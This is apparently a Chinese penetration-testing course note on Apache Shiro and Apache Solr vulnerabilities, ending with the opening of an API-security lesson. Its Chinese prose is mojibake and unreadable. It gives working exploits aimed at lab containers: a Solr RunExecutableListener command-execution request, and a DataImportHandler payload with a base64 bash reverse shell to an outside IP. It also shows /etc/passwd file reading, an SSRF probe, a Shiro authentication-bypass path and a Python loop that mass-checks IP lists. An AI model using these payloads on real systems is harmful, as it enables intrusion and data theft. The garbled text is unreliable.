<h4 id="ç« èŠ‚å†…å®¹ï¼š-10"><a href="#ç« èŠ‚å†…å®¹ï¼š-10" class="headerlink" title="#ç« èŠ‚å†…å®¹ï¼š"></a>#ç« èŠ‚å†…å®¹ï¼š</h4><p>å¸¸è§ä¸­é—´ä»¶çš„å®‰å…¨æµ‹è¯•ï¼š<br>1ã€é…ç½®ä¸å½“-è§£æ&amp;å¼±å£ä»¤<br>2ã€å®‰å…¨æœºåˆ¶-ç‰¹å®šå®‰å…¨æ¼æ´<br>3ã€å®‰å…¨æœºåˆ¶-å¼±å£ä»¤çˆ†ç ´æ”»å‡»<br>4ã€å®‰å…¨åº”ç”¨-æ¡†æ¶ç‰¹å®šå®‰å…¨æ¼æ´</p>
<h4 id="å‰ç½®çŸ¥è¯†ï¼š-13"><a href="#å‰ç½®çŸ¥è¯†ï¼š-13" class="headerlink" title="#å‰ç½®çŸ¥è¯†ï¼š"></a>#å‰ç½®çŸ¥è¯†ï¼š</h4><p>-ä¸­é—´ä»¶å®‰å…¨æµ‹è¯•æµç¨‹ï¼š<br>1ã€åˆ¤æ–­ä¸­é—´ä»¶ä¿¡æ¯-åç§°&amp;ç‰ˆæœ¬&amp;ä¸‰æ–¹<br>2ã€åˆ¤æ–­ä¸­é—´ä»¶é—®é¢˜-é…ç½®ä¸å½“&amp;å…¬å¼€æ¼æ´<br>3ã€åˆ¤æ–­ä¸­é—´ä»¶åˆ©ç”¨-å¼±å£ä»¤&amp;EXP&amp;æ¡†æ¶æ¼æ´</p>
<p>-åº”ç”¨æœåŠ¡å®‰å…¨æµ‹è¯•æµç¨‹ï¼šè§å›¾<br>1ã€åˆ¤æ–­æœåŠ¡å¼€æ”¾æƒ…å†µ-ç«¯å£æ‰«æ&amp;ç»„åˆåº”ç”¨ç­‰<br>2ã€åˆ¤æ–­æœåŠ¡ç±»å‹å½’å±-æ•°æ®åº“&amp;æ–‡ä»¶ä¼ è¾“&amp;é€šè®¯ç­‰<br>3ã€åˆ¤æ–­æœåŠ¡åˆ©ç”¨æ–¹å¼-ç‰¹å®šæ¼æ´&amp;æœªæˆæƒ&amp;å¼±å£ä»¤ç­‰</p>
<p>-å¼€å‘æ¡†æ¶ç»„ä»¶å®‰å…¨æµ‹è¯•æµç¨‹ï¼š<br>1ã€åˆ¤æ–­å¸¸è§è¯­è¨€å¼€å‘æ¡†æ¶ç±»å‹<br>2ã€åˆ¤æ–­å¼€å‘æ¡†æ¶å­˜åœ¨çš„CVEé—®é¢˜<br>3ã€åˆ¤æ–­å¼€å‘æ¡†æ¶CVEæ¼æ´åˆ©ç”¨æ–¹å¼</p>
<ul>
<li><h4 id="ApacheShiro-ç»„ä»¶æ¡†æ¶å®‰å…¨"><a href="#ApacheShiro-ç»„ä»¶æ¡†æ¶å®‰å…¨" class="headerlink" title="ApacheShiro-ç»„ä»¶æ¡†æ¶å®‰å…¨"></a>ApacheShiro-ç»„ä»¶æ¡†æ¶å®‰å…¨</h4></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Apache Shiroæ˜¯ä¸€ä¸ªå¼ºå¤§ä¸”æ˜“ç”¨çš„Javaå®‰å…¨æ¡†æ¶ï¼Œç”¨äºèº«ä»½éªŒè¯ã€æˆæƒã€å¯†ç å’Œä¼šè¯ç®¡ç†</span><br><span class="line">åˆ¤æ–­ï¼šå¤§å¤šä¼šå‘ç”Ÿåœ¨ç™»å½•å¤„ï¼Œè¿”å›åŒ…é‡ŒåŒ…å«remeberMe=deleteMeå­—æ®µï¼Œä¸»è¦ç”¨åˆ°javaä¸­</span><br><span class="line">æœç´¢ï¼šheader=&quot;remeberMe=deleteMe&quot;</span><br><span class="line">åœ¨cookieä¸­å¸¦æœ‰ï¼šSet-Cookie: remeberMe=deleteMe; Path=/; Max-Age=0; Expires=Tue, 26-Apr-2022 22:23:24 GMT</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æ¼æ´ï¼šhttps://avd.aliyun.com/search?q=shiro</span><br><span class="line">Apache Shiro &lt;= 1.2.4 é»˜è®¤å¯†é’¥è‡´å‘½ä»¤æ‰§è¡Œæ¼æ´ã€CVE-2016-4483ã€‘</span><br><span class="line">Apache Shiro &lt; 1.3.2 éªŒè¯ç»•è¿‡æ¼æ´ã€CVE-2016-2807ã€‘</span><br><span class="line">Apache Shiro &lt; 1.4.2 cookie oracle paddingæ¼æ´ ã€CVE-2019-12442ã€‘</span><br><span class="line">Apache Shiro &lt; 1.5.2 éªŒè¯ç»•è¿‡æ¼æ´ ã€CVE-2020-1957ã€‘</span><br><span class="line">Apache Shiro &lt; 1.5.3 éªŒè¯ç»•è¿‡æ¼æ´ ã€CVE-2020-11989ã€‘</span><br><span class="line">Apahce Shiro &lt; 1.6.0 éªŒè¯ç»•è¿‡æ¼æ´ ã€CVE-2020-13933ã€‘</span><br><span class="line">Apahce Shiro &lt; 1.7.1 æƒé™ç»•è¿‡æ¼æ´ ã€CVE-2020-17523ã€‘</span><br><span class="line">1ã€CVE_2016_4437 Shiro-550+Shiro-721</span><br><span class="line">ç¯å¢ƒï¼šhttps://vulfocus.cn/#/dashboard?image_id=df02a278-761c-483b-913f-9f8142b9a19f</span><br><span class="line"> </span><br><span class="line">åœ¨GUI_Toolsä¸­ä¹Ÿæœ‰ä»–æ£€æµ‹çš„æ¼æ´åˆ©ç”¨ã€‚å…ˆç‚¹å‡»æ£€æµ‹å½“å‰ç§˜é’¥ï¼Œç„¶åçˆ†ç ´ç§˜é’¥ï¼Œåœ¨æ¥ç€çˆ†ç ´åˆ©ç”¨é“¾åŠå›æ˜¾ã€‚å›æ˜¾ç»“æœï¼š å‘ç°æ„é€ é“¾:CommonsCollections2  å›æ˜¾æ–¹å¼: TomcatEchoç„¶ååœ¨é€‰æ‹©ç›¸å¯¹åº”çš„ã€‚å¯ä»¥æ‰§è¡Œå‘½ä»¤ã€‚</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2ã€CVE-2020-11989</span><br><span class="line">æ¼æ´ä¸‹è½½åœ°å€ï¼šhttps://github.com/jweny/shiro-cve-2020-17523</span><br><span class="line">å½±å“èŒƒå›´ï¼šApache Shiro &lt; 1.7.1</span><br><span class="line"> </span><br><span class="line">ä¸‹è½½æºç ï¼Œç”¨ideaæ‰“å¼€ï¼Œç›´æ¥å¯åŠ¨ï¼Œé»˜è®¤å¼€æ”¾9090ç«¯å£ï¼Œè®¿é—®ï¼šhttp://127.0.0.1:9090/</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">é»˜è®¤åŠ è½½çš„åœ°æ–¹ï¼šorg.test.springbootshiro.SpringbootShiroApplication</span><br><span class="line">ç‚¹å‡»springbookshiroapplication ç„¶åedit</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">åœ¨\src\main\java\org\test\springbootshiroç›®å½•ä¸‹ï¼Œæœ‰LoginController.javaï¼ŒSpringbootShiroApplication.javaä¸¤ä¸ªæ–‡ä»¶</span><br><span class="line"> </span><br><span class="line">åœ¨LoginController.javaä¸­ï¼Œè®¿é—®/doLoginï¼Œå°è¯•è¾“å…¥è´¦å·å¯†ç ï¼ŒæˆåŠŸæç¤ºsuccessï¼Œå¤±è´¥æç¤ºfailed</span><br><span class="line">è´¦å·å¯†ç é…ç½®æ–‡ä»¶æ˜¯åœ¨MyRealm.javaæ–‡ä»¶ä¸­é…ç½®ï¼šjava 123</span><br><span class="line"> </span><br><span class="line">å½“ç›´æ¥è®¿é—®http://127.0.0.1:9090/admin/xxxçš„æ—¶å€™ï¼Œåœ°å€å°±è‡ªåŠ¨æ¢æˆhttp://127.0.0.1:9090/loginï¼Œæ˜¾ç¤ºå†…å®¹ä¸ºplease login!ï¼Œå°±æ˜¯è¦ç™»å½•çš„æ„æ€ã€‚</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">è¿™ä¸ªæ¼æ´æ˜¯ç›´æ¥è®¿é—®ï¼šhttp://127.0.0.1:9090/admin/%20</span><br><span class="line">è¿™æ ·å°±å¯ä»¥ç›´æ¥ç™»å½•åˆ°åå°ã€‚</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å¦‚æœåœ¨ç™½ç›’çš„è§’åº¦åˆ†æçš„è¯ï¼Œè¿™ä¸ªæ¼æ´æ˜¯æ€ä¹ˆäº§ç”Ÿçš„ã€‚åœ¨LoginController.javaè¿™ä¸ªæ–‡ä»¶ä¸­ï¼Œè¿™ä¸ªæ–‡ä»¶å¼•ç”¨äº†ä¸€ä¸ªåŒ…ï¼šimport org.apache.shiro.SecurityUtils;</span><br><span class="line">åœ¨pom.xmlé…ç½®æ–‡ä»¶ä¸­ï¼š</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.apache.shiro&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;shiro-web&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;1.7.0&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line"> </span><br><span class="line">å¼•ç”¨äº†è¿™ä¸ªæ¡†æ¶org.apache.shiroï¼Œç‰ˆæœ¬æ˜¯1.7.0ç¬¦åˆæ¼æ´ç‰ˆæœ¬ã€‚</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3ã€CVE-2020-1957</span><br><span class="line">å½±å“èŒƒå›´ï¼šApache Shiro &lt; 1.5.3</span><br><span class="line"> </span><br><span class="line">å¯åŠ¨ç¯å¢ƒï¼š</span><br><span class="line">cd /vulhub-master/shiro$ cd CVE-2020-1957</span><br><span class="line">sudo docker-compose up -d</span><br><span class="line"> </span><br><span class="line">è®¿é—®ï¼šhttp://192.168.233.128:8080/ï¼Œç‚¹å‡»loginè·³è½¬ï¼šhttp://192.168.233.128:8080/login.html</span><br><span class="line">å¦‚æœç›´æ¥è®¿é—®ï¼šhttp://192.168.233.128:8080/xxx/..;/admin/å°±ç›¸å½“äºç›´æ¥è¿›å…¥äº†åå°ç›®å½•</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ä¹Ÿå¯ä»¥åœ¨ç½‘ä¸Šå†™pythonä»£ç æ¥è¿›è¡Œæµ‹è¯•ï¼š</span><br><span class="line">è¯­æ³•ï¼šapp=&quot;APACHE-Shiro&quot;</span><br><span class="line"> </span><br><span class="line">import os</span><br><span class="line">import requests</span><br><span class="line"> </span><br><span class="line">for url in open(&#x27;ips.txt&#x27;):</span><br><span class="line">	url=url.strip()</span><br><span class="line">	url=&#x27;http://&#x27;+url+&#x27;/;/login&#x27;</span><br><span class="line">	try:</span><br><span class="line">		code=requests.get(url).status_code</span><br><span class="line">		print(code)</span><br><span class="line">		if code==200:</span><br><span class="line">			print(url+&#x27;|ok&#x27;)</span><br><span class="line">	except Exception as e:</span><br><span class="line">		pass</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">é™„åŠ ï¼šshiroæ˜¯å¾ˆæœ‰åçš„æ¼æ´ç‚¹ï¼Œç‰¹åˆ«æ˜¯åœ¨é¢è¯•ä¸­ï¼ŒåŸºæœ¬ä¸Šéƒ½ä¼šé—®åˆ°è¿™ä¸ªçŸ¥è¯†ç‚¹ã€‚</span><br></pre></td></tr></table></figure>

<ul>
<li><h4 id="ApacheSolr-ç»„ä»¶æ¡†æ¶å®‰å…¨"><a href="#ApacheSolr-ç»„ä»¶æ¡†æ¶å®‰å…¨" class="headerlink" title="ApacheSolr-ç»„ä»¶æ¡†æ¶å®‰å…¨"></a>ApacheSolr-ç»„ä»¶æ¡†æ¶å®‰å…¨</h4></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Apache Solræ˜¯ä¸€ä¸ªå¼€æºçš„æœç´¢æœåŠ¡ï¼Œä½¿ç”¨Javaè¯­è¨€å¼€å‘ï¼Œä¸»è¦åŸºäºHTTPå’ŒApache Luceneå®ç°çš„ã€‚Solræ˜¯ä¸€ä¸ªé«˜æ€§èƒ½ï¼Œé‡‡ç”¨Java5å¼€å‘ï¼ŒåŸºäºLuceneçš„å…¨æ–‡æœç´¢æœåŠ¡å™¨ã€‚</span><br><span class="line"> </span><br><span class="line">æ¼æ´ï¼šhttps://avd.aliyun.com/search?q=solr</span><br><span class="line">è¿œç¨‹å‘½ä»¤æ‰§è¡ŒRCEï¼ˆCVE-2017-12629ï¼‰</span><br><span class="line">è¿œç¨‹å‘½ä»¤æ‰§è¡ŒXXEï¼ˆCVE-2017-12629ï¼‰</span><br><span class="line">ä»»æ„æ–‡ä»¶è¯»å–ANDå‘½ä»¤æ‰§è¡Œï¼ˆCVE-2019-17558ï¼‰</span><br><span class="line">è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´(CVE-2019-0192)</span><br><span class="line">è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´(CVE-2019-0193)</span><br><span class="line">æœªæˆæƒä¸Šä¼ æ¼æ´(CVE-2020-13957)</span><br><span class="line">Apache Solr SSRF (CVE-2021-27905)</span><br><span class="line">1ã€è¿œç¨‹å‘½ä»¤æ‰§è¡ŒRCEï¼ˆCVE-2017-12629ï¼‰</span><br><span class="line">å½±å“ç‰ˆæœ¬ï¼šApache solr&lt;7.1.0ç‰ˆæœ¬</span><br><span class="line">è¯­æ³•ï¼šapp=&quot;APACHE-Solr&quot; &amp;&amp; title==&quot;Solr Admin&quot;</span><br><span class="line"> </span><br><span class="line">å¯åŠ¨ç¯å¢ƒï¼š</span><br><span class="line">cd /vulhub-master/solr/CVE-2017-12629-RCE</span><br><span class="line">sudo docker-compose up -d</span><br><span class="line"> </span><br><span class="line">å‚è€ƒï¼šhttps://vulhub.org/#/environments/solr/CVE-2017-12629-RCE/</span><br><span class="line"> </span><br><span class="line">è®¿é—®ï¼šhttp://192.168.233.128:8983/solr/#/</span><br><span class="line">è®¿é—®ç‰¹å®šåœ°å€è¿›è¡ŒæŠ“åŒ…ï¼š</span><br><span class="line">http://192.168.233.128:8983/solr/demo/config</span><br><span class="line">POSTæäº¤ï¼š&#123;&quot;add-listener&quot;:&#123;&quot;event&quot;:&quot;postCommit&quot;,&quot;name&quot;:&quot;newlistener&quot;,&quot;class&quot;:&quot;solr.RunExecutableListener&quot;,&quot;exe&quot;:&quot;sh&quot;,&quot;dir&quot;:&quot;/bin/&quot;,&quot;args&quot;:[&quot;-c&quot;, &quot;touch /tmp/success&quot;]&#125;&#125;</span><br><span class="line">æ‰§è¡Œçš„å‘½ä»¤æ˜¯ï¼štouch /tmp/success</span><br><span class="line">æ•°æ®åŒ…ï¼š</span><br><span class="line">POST /solr/demo/config HTTP/1.1</span><br><span class="line">Host: 192.168.233.128:8983</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">DNT: 1</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 158</span><br><span class="line"> </span><br><span class="line">&#123;&quot;add-listener&quot;:&#123;&quot;event&quot;:&quot;postCommit&quot;,&quot;name&quot;:&quot;newlistener&quot;,&quot;class&quot;:&quot;solr.RunExecutableListener&quot;,&quot;exe&quot;:&quot;sh&quot;,&quot;dir&quot;:&quot;/bin/&quot;,&quot;args&quot;:[&quot;-c&quot;, &quot;touch /tmp/success&quot;]&#125;&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ä½†æ˜¯å¤±è´¥äº†ï¼Œç„¶åæŒ‰ç…§å®˜æ–¹çš„åŸå°ä¸åŠ¨çš„å‘ï¼š</span><br><span class="line">POST /solr/demo/config HTTP/1.1</span><br><span class="line">Host: 192.168.233.128:8983</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 158</span><br><span class="line"> </span><br><span class="line">&#123;&quot;add-listener&quot;:&#123;&quot;event&quot;:&quot;postCommit&quot;,&quot;name&quot;:&quot;newlistener&quot;,&quot;class&quot;:&quot;solr.RunExecutableListener&quot;,&quot;exe&quot;:&quot;sh&quot;,&quot;dir&quot;:&quot;/bin/&quot;,&quot;args&quot;:[&quot;-c&quot;, &quot;touch /tmp/success&quot;]&#125;&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">è¿›å…¥dockerç¯å¢ƒæŸ¥çœ‹æ˜¯å¦æˆåŠŸï¼š</span><br><span class="line">è¿›å…¥ï¼šsudo docker-compose exec solr bash</span><br><span class="line">æŸ¥çœ‹ï¼šls /tmp</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2ã€ä»»æ„æ–‡ä»¶è¯»å–ANDå‘½ä»¤æ‰§è¡Œï¼ˆCVE-2019-17558ï¼‰</span><br><span class="line">å½±å“ç‰ˆæœ¬ï¼šApache Solr 5.0.0ç‰ˆæœ¬è‡³8.3.1</span><br><span class="line"> </span><br><span class="line">ç¯å¢ƒï¼šhttps://vulfocus.cn/#/dashboard?image_id=0c32e104-8afe-433d-8b10-904d18704bef</span><br><span class="line"> </span><br><span class="line">åˆ©ç”¨è„šæœ¬ï¼šhttps://github.com/jas502n/solr_rce</span><br><span class="line"> </span><br><span class="line">è¿™ä¸ªè„šæœ¬é‡‡ç”¨äº†python2å¼€å‘ï¼Œç”¨åˆ°è™šæ‹Ÿæœºçš„python2ç¯å¢ƒã€‚</span><br><span class="line">æ‰§è¡Œå‘½ä»¤ï¼š</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ä¹Ÿå¯ä»¥è¿›è¡Œæ‰¹é‡æµ‹è¯•ï¼Œä¿®æ”¹solr_rce.pyæ–‡ä»¶</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3ã€è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´(CVE-2019-0193)</span><br><span class="line">å½±å“ç‰ˆæœ¬ï¼šApache Solr &lt; 8.2.0ç‰ˆæœ¬</span><br><span class="line">éœ€è¦ç™»å½•æ‰èƒ½åˆ©ç”¨ã€‚</span><br><span class="line"> </span><br><span class="line">å¯åŠ¨ç¯å¢ƒï¼š</span><br><span class="line">cd /vulhub-master/solr/CVE-2019-0193</span><br><span class="line">sudo docker-compose up -d</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">å‚è€ƒï¼šhttps://vulhub.org/#/environments/solr/CVE-2019-0193/</span><br><span class="line"> </span><br><span class="line">è®¿é—®ï¼šhttp://192.168.233.128:8983/solr/#/</span><br><span class="line">é»˜è®¤æ˜¯æ²¡æœ‰testçš„ï¼Œåœ¨æ‰§è¡Œï¼šsudo docker-compose exec solr bash bin/solr create_core -c test -d example/example-DIH/solr/db</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æŠŠpocè¿›è¡Œå¤åˆ¶ï¼š</span><br><span class="line">&lt;dataConfig&gt;</span><br><span class="line">  &lt;dataSource type=&quot;URLDataSource&quot;/&gt;</span><br><span class="line">  &lt;script&gt;&lt;![CDATA[</span><br><span class="line">          function poc()&#123; java.lang.Runtime.getRuntime().exec(&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzUuMTc4LjE1MS4yOS81NTY2IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;);</span><br><span class="line">          &#125;</span><br><span class="line">  ]]&gt;&lt;/script&gt;</span><br><span class="line">  &lt;document&gt;</span><br><span class="line">    &lt;entity name=&quot;stackoverflow&quot;</span><br><span class="line">            url=&quot;https://stackoverflow.com/feeds/tag/solr&quot;</span><br><span class="line">            processor=&quot;XPathEntityProcessor&quot;</span><br><span class="line">            forEach=&quot;/feed&quot;</span><br><span class="line">            transformer=&quot;script:poc&quot; /&gt;</span><br><span class="line">  &lt;/document&gt;</span><br><span class="line">&lt;/dataConfig&gt;</span><br><span class="line"> </span><br><span class="line">å…¶ä¸­YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny45NC4yMzYuMTE3LzU1NjYgMD4mMQ==æ˜¯åå¼¹å‘½ä»¤base64ç¼–ç ã€‚</span><br><span class="line">åå¼¹å‘½ä»¤ï¼šbash -i &gt;&amp; /dev/tcp/175.178.151.29/5566 0&gt;&amp;1</span><br><span class="line">base64ï¼šYmFzaCAtaSA+JiAvZGV2L3RjcC8xNzUuMTc4LjE1MS4yOS81NTY2IDA+JjE=</span><br><span class="line"> </span><br><span class="line">ç„¶ååœ¨ç‚¹å‡»execute with this configuration</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">4ã€Apache Solr æ–‡ä»¶è¯»å–&amp;SSRF (CVE-2021-27905)</span><br><span class="line"> </span><br><span class="line">å¯åŠ¨ç¯å¢ƒï¼š</span><br><span class="line">cd /vulhub-master/solr/Remote-Streaming-Fileread</span><br><span class="line">sudo docker-compose up -d</span><br><span class="line"> </span><br><span class="line">è®¿é—®ï¼šhttp://192.168.233.128:8983/solr/#!/</span><br><span class="line">1ã€è·å–æ•°æ®åº“å</span><br><span class="line">http://192.168.233.128:8983/solr/admin/cores?indexInfo=false&amp;wt=json</span><br><span class="line">æ•°æ®åº“åï¼šdemo</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2ã€è®¿é—®è§¦å‘</span><br><span class="line">curl -i -s -k -X $&#x27;POST&#x27; \</span><br><span class="line">    -H $&#x27;Content-Type: application/json&#x27; --data-binary $&#x27;&#123;\&quot;set-property\&quot;:&#123;\&quot;requestDispatcher.requestParsers.enableRemoteStreaming\&quot;:true&#125;&#125;&#x27; \</span><br><span class="line">    $&#x27;http://192.168.233.128:8983/solr/demo/config&#x27;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3ã€ä»»æ„æ–‡ä»¶è¯»å–</span><br><span class="line">curl -i -s -k &#x27;http://192.168.233.128:8983/solr/demo/debug/dump?param=ContentStreams&amp;stream.url=file:///etc/passwd&#x27;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ä¸ºä»€ä¹ˆè¯´ä¹Ÿæ˜¯ssrfæ¼æ´ï¼Œæ˜¯å› ä¸ºç”¨åˆ°äº†fileåè®®å»è¯»å–ï¼Œè¿™æ ·ä¹Ÿå¯ä»¥è¿›è¡Œå†…ç½‘æ¢é’ˆï¼Œæ¯”å¦‚æŠŠfileåè®®è¿›è¡Œä¿®æ”¹ä¸ºhttpåè®®ã€‚çœ‹æ”¯ä¸æ”¯æŒhttpåè®®å¯ä»¥ç”¨dnslogæ¥è¿›è¡Œåˆ¤æ–­ã€‚</span><br><span class="line">curl -i -s -k &#x27;http://192.168.233.128:8983/solr/demo/debug/dump?param=ContentStreams&amp;stream.url=http://2e8m2t.dnslog.cn&#x27;</span><br><span class="line"> </span><br><span class="line">æ‰§è¡Œèƒ½æ¥å—åˆ°åå¼¹ï¼Œæ‰€ä»¥æ”¯æŒhttpåè®®ã€‚</span><br></pre></td></tr></table></figure>

<h1 id="ç¬¬65å¤©-APIå®‰å…¨-æ¥å£å®‰å…¨-WebPack-REST-SOAP-WSDL-WebService"><a href="#ç¬¬65å¤©-APIå®‰å…¨-æ¥å£å®‰å…¨-WebPack-REST-SOAP-WSDL-WebService" class="headerlink" title="ç¬¬65å¤© APIå®‰å…¨-æ¥å£å®‰å…¨&amp;WebPack&amp;REST&amp;SOAP&amp;WSDL&amp;WebService"></a>ç¬¬65å¤© APIå®‰å…¨-æ¥å£å®‰å…¨&amp;WebPack&amp;REST&amp;SOAP&amp;WSDL&amp;WebService</h1><h3 id="çŸ¥è¯†ç‚¹-5"><a href="#çŸ¥è¯†ç‚¹-5" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h3><p>1.HTTPç±»æ¥å£-æµ‹è¯„<br>2.RPCç±»æ¥å£-æµ‹è¯„<br>3.Web Serviceç±»-æµ‹è¯„<br>å‚è€ƒé“¾æ¥ï¼š<a href="https://www.jianshu.com/p/e48db27d7c70">https://www.jianshu.com/p/e48db27d7c70</a></p>
<h4 id="å†…å®¹ç‚¹ï¼š-1"><a href="#å†…å®¹ç‚¹ï¼š-1" class="headerlink" title="å†…å®¹ç‚¹ï¼š"></a>å†…å®¹ç‚¹ï¼š</h4><p>SOAP(Simple Object Access Protocol)ç®€å•å¯¹è±¡è®¿é—®åè®®æ˜¯äº¤æ¢æ•°æ®çš„ä¸€ç§åè®®è§„èŒƒï¼Œ<br>æ˜¯ä¸€ç§è½»é‡çš„ã€ç®€å•çš„ã€åŸºäºXMLï¼ˆæ ‡å‡†é€šç”¨æ ‡è®°è¯­è¨€ä¸‹çš„ä¸€ä¸ªå­é›†ï¼‰çš„åè®®ï¼Œå®ƒè¢«è®¾è®¡<br>æˆåœ¨WEBä¸Šäº¤æ¢ç»“æ„åŒ–çš„å’Œå›ºåŒ–çš„ä¿¡æ¯ï¼ŒSOAPä¸æ˜¯Web Servicetçš„ä¸“æœ‰åè®®ï¼Œ<br>SOAPä½¿ç”¨HTTPæ¥å‘é€XMLæ ¼å¼çš„æ•°æ®ï¼Œå¯ä»¥ç®€å•ç†è§£ä¸ºï¼šSOAP&#x3D;HTTP+XML</p>
<p>REST(Representational State Transfer)å³è¡¨è¿°æ€§çŠ¶æ€ä¼ é€’ï¼Œåœ¨ä¸‰ç§ä¸»æµçš„WebæœåŠ¡å®<br>ç°æ–¹æ¡ˆä¸­ï¼Œå› ä¸ºRESTæ¨¡å¼çš„WbæœåŠ¡ä¸å¤æ‚çš„SOAPå’ŒXML-RPCå¯¹æ¯”æ¥è®²æ˜æ˜¾çš„æ›´åŠ ç®€<br>æ´ï¼Œè¶Šæ¥è¶Šå¤šçš„WebæœåŠ¡å¼€å§‹é‡‡ç”¨RESTé£æ ¼è®¾è®¡å’Œå®ç°ã€‚ä¾‹å¦‚ï¼ŒAmazon.comæä¾›æ¥è¿‘<br>RESTé£æ ¼çš„WebæœåŠ¡è¿›è¡Œå›¾ä¹¦æŸ¥æ‰¾ï¼›é›…è™æä¾›çš„WebæœåŠ¡ä¹Ÿæ˜¯RESTé£æ ¼çš„ã€‚</p>
<p>WSDL(Web Services Description Language)å³ç½‘ç»œæœåŠ¡æè¿°è¯­è¨€ï¼Œç”¨äºæè¿°WebæœåŠ¡<br>çš„å…¬å…±æ¥å£ã€‚è¿™æ˜¯ä¸€ä¸ªåŸºäºXMLçš„å…³äºå¦‚ä½•ä¸WbæœåŠ¡é€šè®¯å’Œä½¿ç”¨çš„æœåŠ¡æè¿°ï¼›ä¹Ÿå°±æ˜¯æ<br>è¿°ä¸ç›®å½•ä¸­åˆ—å‡ºçš„WbæœåŠ¡è¿›è¡Œäº¤äº’æ—¶éœ€è¦ç»‘å®šçš„åè®®å’Œä¿¡æ¯æ ¼å¼ã€‚é€šå¸¸é‡‡ç”¨æŠ½è±¡è¯­è¨€æ<br>è¿°è¯¥æœåŠ¡æ”¯æŒçš„æ“ä½œå’Œä¿¡æ¯ï¼Œä½¿ç”¨çš„æ—¶å€™å†å°†å®é™…çš„ç½‘ç»œåè®®å’Œä¿¡æ¯æ ¼å¼ç»‘å®šç»™è¯¥æœåŠ¡ã€‚</p>
